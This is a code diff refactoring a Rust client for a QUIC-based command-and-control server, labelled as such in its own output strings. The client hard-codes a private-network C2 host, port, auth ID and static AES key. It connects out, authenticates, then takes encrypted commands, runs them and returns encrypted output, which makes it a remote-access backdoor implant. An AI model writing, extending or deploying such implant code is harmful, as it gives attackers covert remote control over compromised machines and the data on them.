@@ -16,6 +16,11 @@ use std::sync::Arc;
 type Aes128CbcEnc = cbc::Encryptor<Aes128>;
 type Aes128CbcDec = cbc::Decryptor<Aes128>;
 
+const HOST: &str = "192.168.1.107";
+const PORT: u16 = 1111;
+const AUTH_ID: &str = "795823a9-90c7-4962-a1d1-b3688845b4a6";
+const ENCRYPTION_KEY: &str = "1234567890123456";
+
 struct AesCipher {
     key: [u8; 16],
 }
@@ -480,25 +485,19 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     println!("[*] Starting QUIC Client (AES encrypted)...");
 
-    let host = "192.168.1.107";
-    let port: u16 = 1111;
-    let auth_id = "795823a9-90c7-4962-a1d1-b3688845b4a6";
-    let encryption_key = "1234567890123456"; 
-
-    let cipher = Arc::new(AesCipher::new(encryption_key));
+    let cipher = Arc::new(AesCipher::new(ENCRYPTION_KEY));
 
     let client_cfg = configure_client();
     let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
     endpoint.set_default_client_config(client_cfg);
 
-    let addr = format!("{}:{}", host, port).parse()?;
-    let connection = endpoint.connect(addr, host)?.await?;
+    let addr = format!("{}:{}", HOST, PORT).parse()?;
+    let connection = endpoint.connect(addr, HOST)?.await?;
     println!("[+] Connected to QUIC C2 Server.");
-    println!("[+] Auth ID: {}", auth_id);
-
+    println!("[+] Auth ID: {}", AUTH_ID);
 
     let (mut auth_send, _auth_recv) = connection.open_bi().await?;
-    let encrypted_auth = cipher.encrypt(auth_id.as_bytes());
+    let encrypted_auth = cipher.encrypt(AUTH_ID.as_bytes());
     tokio::io::AsyncWriteExt::write_all(&mut auth_send, &encrypted_auth).await?;
     auth_send.finish()?;
 
@@ -510,7 +509,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 let cipher = cipher.clone();
                 tokio::spawn(async move {
                     if let Ok(data) = recv.read_to_end(4 * 1024 * 1024).await {
-                        // Decrypt incoming command
                         let command = match cipher.decrypt(&data) {
                             Ok(plain) => String::from_utf8_lossy(&plain).trim().to_string(),
                             Err(e) => {
@@ -531,7 +529,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                                 .await
                                 .unwrap_or_else(|e| format!("ERROR: {}", e))
                         };
-
 
                         let encrypted_response = cipher.encrypt(response.as_bytes());
                         let _ = send.write_all(&encrypted_response).await;
